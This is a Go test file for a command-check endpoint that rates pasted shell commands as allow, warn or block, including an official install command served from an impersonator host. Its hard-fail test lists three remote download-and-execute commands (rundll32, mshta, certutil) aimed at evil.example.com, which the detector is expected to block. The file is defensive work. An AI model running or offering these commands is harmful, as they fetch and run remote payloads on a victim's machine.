package httpgw

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"
)

// minimal Server stub for the handler — commandCheck doesn't touch any
// dependency injected via Server, so a zero-value works.
func newCmdCheckServer() *Server { return &Server{} }

func TestCommandCheck_OfficialAnthropic(t *testing.T) {
	s := newCmdCheckServer()
	body, _ := json.Marshal(commandCheckRequest{
		PageURL: "https://docs.anthropic.com/en/docs/claude-code/quickstart",
		Command: "curl -fsSL https://claude.ai/install.sh | bash",
	})
	r := httptest.NewRequest("POST", "/v1/command-check", bytes.NewReader(body))
	w := httptest.NewRecorder()
	s.commandCheck(w, r)
	if w.Code != http.StatusOK {
		t.Fatalf("status %d", w.Code)
	}
	var resp commandCheckResponse
	_ = json.NewDecoder(w.Body).Decode(&resp)
	if resp.Verdict != "ALLOW" || resp.OfficialBrand != "anthropic" {
		t.Errorf("expected ALLOW/anthropic, got %+v", resp)
	}
}

func TestCommandCheck_OfficialOnImpersonatorHost(t *testing.T) {
	s := newCmdCheckServer()
	body, _ := json.Marshal(commandCheckRequest{
		PageURL: "https://ravishingtattle.com/docs",
		Command: "curl -fsSL https://claude.ai/install.sh | bash",
	})
	r := httptest.NewRequest("POST", "/v1/command-check", bytes.NewReader(body))
	w := httptest.NewRecorder()
	s.commandCheck(w, r)
	var resp commandCheckResponse
	_ = json.NewDecoder(w.Body).Decode(&resp)
	// Real Anthropic command on a fake host — official_match's host gate
	// rejects, then the command itself has no IOC patterns, so we fall
	// through to ALLOW with 1 soft signal (curl|sh) on untrusted -> WARN.
	if resp.Verdict != "WARN" {
		t.Errorf("expected WARN on untrusted host with single soft signal, got %+v", resp)
	}
}

func TestCommandCheck_HardFailBlocks(t *testing.T) {
	s := newCmdCheckServer()
	cases := []string{
		`rundll32.exe \\evil.example.com\share\loader.dll,EntryPoint`,
		`mshta.exe https://evil.example.com/x.hta`,
		`certutil -urlcache -split -f https://evil.example.com/p.exe`,
	}
	for _, cmd := range cases {
		t.Run(cmd[:30], func(t *testing.T) {
			body, _ := json.Marshal(commandCheckRequest{
				PageURL: "https://anything.example",
				Command: cmd,
			})
			r := httptest.NewRequest("POST", "/v1/command-check", bytes.NewReader(body))
			w := httptest.NewRecorder()
			s.commandCheck(w, r)
			var resp commandCheckResponse
			_ = json.NewDecoder(w.Body).Decode(&resp)
			if resp.Verdict != "BLOCK" {
				t.Errorf("expected BLOCK for %q, got %+v", cmd, resp)
			}
		})
	}
}

func TestCommandCheck_EmptyCommand(t *testing.T) {
	s := newCmdCheckServer()
	body, _ := json.Marshal(commandCheckRequest{PageURL: "https://x.example", Command: ""})
	r := httptest.NewRequest("POST", "/v1/command-check", bytes.NewReader(body))
	w := httptest.NewRecorder()
	s.commandCheck(w, r)
	var resp commandCheckResponse
	_ = json.NewDecoder(w.Body).Decode(&resp)
	if resp.Verdict != "ALLOW" {
		t.Errorf("empty command should ALLOW (nothing to analyze), got %+v", resp)
	}
}

func TestCommandCheck_BenignCommand(t *testing.T) {
	s := newCmdCheckServer()
	body, _ := json.Marshal(commandCheckRequest{
		PageURL: "https://docs.docker.com/get-started",
		Command: "docker run hello-world",
	})
	r := httptest.NewRequest("POST", "/v1/command-check", bytes.NewReader(body))
	w := httptest.NewRecorder()
	s.commandCheck(w, r)
	var resp commandCheckResponse
	_ = json.NewDecoder(w.Body).Decode(&resp)
	if resp.Verdict != "ALLOW" {
		t.Errorf("benign command should ALLOW, got %+v", resp)
	}
}
